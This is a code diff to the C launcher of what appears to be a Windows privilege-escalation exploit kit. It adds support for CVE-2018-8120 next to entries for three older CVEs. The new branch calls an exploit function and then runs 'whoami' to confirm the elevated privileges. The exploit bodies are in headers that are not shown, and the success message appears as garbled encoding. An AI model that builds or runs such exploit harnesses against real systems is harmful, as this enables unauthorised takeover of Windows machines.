@@ -2,8 +2,9 @@
 #include "CVE-2015-2546.h"
 #include "CVE-2015-0057.h"
 #include "CVE-2016-0095.h"
+#include "CVE-2018-8120.h"
 
-#define VUL_NAME "CVE-2016-0095"
+#define VUL_NAME "CVE-2018-8120"
 
 int main()
 {
@@ -31,9 +32,16 @@ int main()
 			system("whoami");
 		}
 	}
+	else if (strcmp(VUL_NAME, "CVE-2018-8120") == 0)
+	{
+		if (Exploit_CVE_2018_8120())
+		{
+			printf("Exploit CVE-2018-8120 Íê³É...\n");
+			system("whoami");
+		}
+	}
 
 
-	
 	system("pause");
 
 	return 0;
